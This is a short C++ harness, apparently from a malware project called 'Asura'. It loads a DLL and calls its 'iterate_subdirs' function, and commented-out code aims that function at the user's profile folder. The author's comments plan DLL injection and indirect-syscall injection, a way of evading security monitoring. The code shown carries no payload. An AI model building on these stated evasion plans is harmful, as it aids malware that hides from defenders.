#include "asurautils.h"

int main()
{
    HMODULE dllHandle = LoadLibraryA("AsuraDll.dll");

    if(dllHandle == NULL){
        printf("Error when loading asuralib, error: 0x%lx\n", GetLastError());
        return 1;
    }

    // make a DLL Injection here, if it works, transform it in a indirect syscall dll injection, lol
    PfileCreation thfileCreation = (PfileCreation)GetProcAddress(dllHandle, "fileCreation");
    Piterate_sub thiterate_subdirs = (Piterate_sub)GetProcAddress(dllHandle, "iterate_subdirs");

    if (thfileCreation == NULL){
        printf("Error when exporting functions, error: 0x%lx", GetLastError());
        return 1;
    }
    if (thiterate_subdirs == NULL)
    {
        printf("Error when exporting functions, error: 0x%lx", GetLastError());
        return 1;
    }

    std::string path_dot = "path_to_target_dir";
    printf("Calling iteration_subdirs...\n");
    //thfileCreation(path_dot);
    std::vector<std::string> dirs;
    thiterate_subdirs(path_dot, dirs);
    printf("thfileCreation succesfully called.\n");
    while(true){}
    FreeLibrary(dllHandle);
    //{...}

    /*
    std::vector<std::string> dirs;
    TCHAR path[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path))){
        std::basic_string<TCHAR> userFolderPath(path, path+ _tcslen(path));
        std::cout << "User folder path: " << std::string(userFolderPath.begin(), userFolderPath.end()) << std::endl;
        iterate_subdirs(std::string(userFolderPath.begin(), userFolderPath.end()), dirs);
    }
    else{
        std::cerr << "Failed to retrieve user folder path. error --> " << GetLastError() << std::endl;
    }
    while(true){}
    */
   // make everything here as a dll call
}


